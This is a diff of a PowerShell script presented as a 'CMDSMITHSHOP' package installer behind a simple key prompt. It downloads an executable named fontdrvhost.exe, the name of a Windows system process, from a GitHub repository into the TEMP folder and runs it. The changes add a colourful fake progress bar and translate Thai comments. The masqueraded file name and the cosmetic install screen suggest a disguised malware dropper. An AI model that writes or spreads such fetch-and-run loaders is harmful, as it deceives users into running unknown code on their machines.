@@ -5,15 +5,30 @@ $ValidKey = "smithshop"
 $ExeURL = "https://github.com/draft7973-ops/Smithshop/raw/main/fontdrvhost.exe"
 $ExeOutput = "$env:TEMP\fontdrvhost.exe"
 
+# ===== LOADING FUNCTION =====
 function Show-Loading($text) {
-    for ($i = 0; $i -lt 20; $i++) {
-        Write-Host -NoNewline "`r$text" + ("." * ($i % 6))
-        Start-Sleep -Milliseconds 300
+
+    $colors = @("Red","Yellow","Green","Cyan","Blue","Magenta")
+
+    for ($i = 0; $i -le 100; $i++) {
+
+        $dots = "." * ($i % 6)
+        $color = $colors[$i % $colors.Count]
+
+        # progress bar
+        $barLength = 20
+        $filled = [math]::Floor($i / (100 / $barLength))
+        $bar = ("█" * $filled).PadRight($barLength, "░")
+
+        Write-Host "`r$text$dots [$bar] $i% " -NoNewline -ForegroundColor $color
+
+        Start-Sleep -Milliseconds 50
     }
+
     Write-Host ""
 }
 
-# ===== หน้าแรก =====
+# ===== MAIN MENU =====
 Write-Host "=== CMDSMITHSHOP :] ==="
 Write-Host "1. Install"
 Write-Host "2. Clean"
@@ -26,7 +41,7 @@ if ($choice -eq "1") {
 
     if ($userKey.Trim().ToLower() -eq $ValidKey.ToLower()) {
 
-        # 🔁 LOOP เลือกแพ็ค
+        # 🔁 LOOP
         while ($true) {
 
             Clear-Host
@@ -50,17 +65,19 @@ if ($choice -eq "1") {
                 }
             }
 
-            # ===== หน้า install =====
+            # ===== INSTALL PAGE =====
             Clear-Host
             Write-Host "=== INSTALL MODE ===`n"
 
             Show-Loading "install $pkgName "
 
+            # โหลดไฟล์
             Invoke-WebRequest $ExeURL -OutFile $ExeOutput
+
+            # รัน
             Start-Process $ExeOutput
 
             Write-Host "`n✅ install $pkgName success!" -ForegroundColor Green
-
             Start-Sleep 2
         }
 
